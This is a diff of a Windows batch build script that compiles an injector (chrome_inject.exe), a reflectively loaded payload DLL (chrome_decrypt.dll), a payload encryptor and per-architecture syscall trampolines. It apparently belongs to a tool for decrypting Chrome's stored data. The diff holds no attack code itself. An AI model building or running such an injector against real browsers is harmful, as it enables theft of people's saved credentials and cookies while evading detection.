@@ -5,6 +5,8 @@ setlocal enabledelayedexpansion
 :: =                            CONFIGURATION                                  =
 :: =============================================================================
 set "BUILD_DIR=build"
+set "SRC_DIR=src"
+set "LIBS_DIR=libs"
 set "FINAL_EXE_NAME=chrome_inject.exe"
 set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
@@ -114,7 +116,7 @@ goto :eof
 
 :compile_sqlite
     call :log_step "[1/6] Compiling SQLite3 Library"
-    set "CMD_COMPILE=cl %CFLAGS_COMMON% /c libs\sqlite\sqlite3.c /Fo"%BUILD_DIR%\sqlite3.obj""
+    set "CMD_COMPILE=cl %CFLAGS_COMMON% /c %LIBS_DIR%\sqlite\sqlite3.c /Fo"%BUILD_DIR%\sqlite3.obj""
     set "CMD_LINK=lib /NOLOGO /OUT:"%BUILD_DIR%\sqlite3.lib" "%BUILD_DIR%\sqlite3.obj""
     call :run_command "%CMD_COMPILE%" "  - Compiling C object file..."
     if %errorlevel% neq 0 exit /b 1
@@ -126,11 +128,11 @@ goto :eof
 
 :compile_payload
     call :log_step "[2/6] Compiling Payload DLL (%PAYLOAD_DLL_NAME%)"
-    set "CMD_C=cl %CFLAGS_COMMON% /c src\reflective_loader.c /Fo"%BUILD_DIR%\reflective_loader.obj""
+    set "CMD_C=cl %CFLAGS_COMMON% /c %SRC_DIR%\reflective_loader.c /Fo"%BUILD_DIR%\reflective_loader.obj""
     call :run_command "%CMD_C%" "  - Compiling C file (reflective_loader.c)..."
     if %errorlevel% neq 0 exit /b 1
 
-    set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /Ilibs\sqlite /c src\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
+    set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\sqlite /c %SRC_DIR%\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
     call :run_command "%CMD_CPP%" "  - Compiling C++ file (chrome_decrypt.cpp)..."
     if %errorlevel% neq 0 exit /b 1
 
@@ -143,7 +145,7 @@ goto :eof
 
 :compile_encryptor
     call :log_step "[3/6] Compiling Encryption Utility (%ENCRYPTOR_EXE_NAME%)"
-    set "CMD=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /Ilibs\chacha src\encryptor.cpp /Fo"%BUILD_DIR%\encryptor.obj" %LFLAGS_COMMON% /OUT:"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%""
+    set "CMD=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\chacha %SRC_DIR%\encryptor.cpp /Fo"%BUILD_DIR%\encryptor.obj" %LFLAGS_COMMON% /OUT:"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%""
     call :run_command "%CMD%" "  - Compiling and linking..."
     if %errorlevel% neq 0 exit /b 1
     call :log_success "Encryptor utility compiled successfully."
@@ -152,7 +154,7 @@ goto :eof
 
 :encrypt_payload
     call :log_step "[4/6] Encrypting Payload DLL"
-    set "CMD="%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc""
+    set "CMD=%BUILD_DIR%\%ENCRYPTOR_EXE_NAME% %BUILD_DIR%\%PAYLOAD_DLL_NAME% %BUILD_DIR%\chrome_decrypt.enc"
     call :run_command "%CMD%" "  - Running encryption process..."
     if %errorlevel% neq 0 exit /b 1
     call :log_success "Payload encrypted to chrome_decrypt.enc."
@@ -161,7 +163,7 @@ goto :eof
 
 :compile_resource
     call :log_step "[5/6] Compiling Resource File"
-    set "CMD=rc.exe /i "%BUILD_DIR%" /fo "%BUILD_DIR%\resource.res" src\resource.rc"
+    set "CMD=rc.exe /i "%BUILD_DIR%" /fo "%BUILD_DIR%\resource.res" %SRC_DIR%\resource.rc"
     call :run_command "%CMD%" "  - Compiling .rc to .res..."
     if %errorlevel% neq 0 exit /b 1
     call :log_success "Resource file compiled successfully."
@@ -170,9 +172,32 @@ goto :eof
 
 :compile_injector
     call :log_step "[6/6] Compiling Final Injector (%FINAL_EXE_NAME%)"
-    set "CMD=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /Ilibs\chacha src\chrome_inject.cpp src\syscalls.cpp /Fo"%BUILD_DIR%\\" "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% /OUT:".\%FINAL_EXE_NAME%""
-    call :run_command "%CMD%" "  - Compiling and linking..."
+    
+    set "TRAMPOLINE_OBJ="
+    if "%VSCMD_ARG_TGT_ARCH%"=="x64" (
+        set "TRAMPOLINE_SRC=%SRC_DIR%\syscall_trampoline_x64.asm"
+        set "TRAMPOLINE_OBJ=%BUILD_DIR%\syscall_trampoline_x64.obj"
+        set "ASM_CMD=ml64.exe /c /Fo"!TRAMPOLINE_OBJ!" "!TRAMPOLINE_SRC!""
+    ) else if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
+        set "TRAMPOLINE_SRC=%SRC_DIR%\syscall_trampoline_arm64.asm"
+        set "TRAMPOLINE_OBJ=%BUILD_DIR%\syscall_trampoline_arm64.obj"
+        set "ASM_CMD=armasm64.exe -nologo "!TRAMPOLINE_SRC!" -o "!TRAMPOLINE_OBJ!""
+    ) else (
+        call :log_error "Unsupported target architecture: %VSCMD_ARG_TGT_ARCH%. Only x64 and arm64 are supported."
+        exit /b 1
+    )
+    
+    call :run_command "!ASM_CMD!" "  - Assembling syscall trampoline (%VSCMD_ARG_TGT_ARCH%)..."
     if %errorlevel% neq 0 exit /b 1
+
+    set "CMD_COMPILE_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\chacha /c %SRC_DIR%\chrome_inject.cpp %SRC_DIR%\syscalls.cpp /Fo"%BUILD_DIR%\\""
+    call :run_command "!CMD_COMPILE_CPP!" "  - Compiling C++ source files..."
+    if %errorlevel% neq 0 exit /b 1
+    
+    set "CMD_LINK=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% /OUT:".\%FINAL_EXE_NAME%""
+    call :run_command "!CMD_LINK!" "  - Linking final executable..."
+    if %errorlevel% neq 0 exit /b 1
+    
     call :log_success "Final injector built successfully."
     echo.
 goto :eof
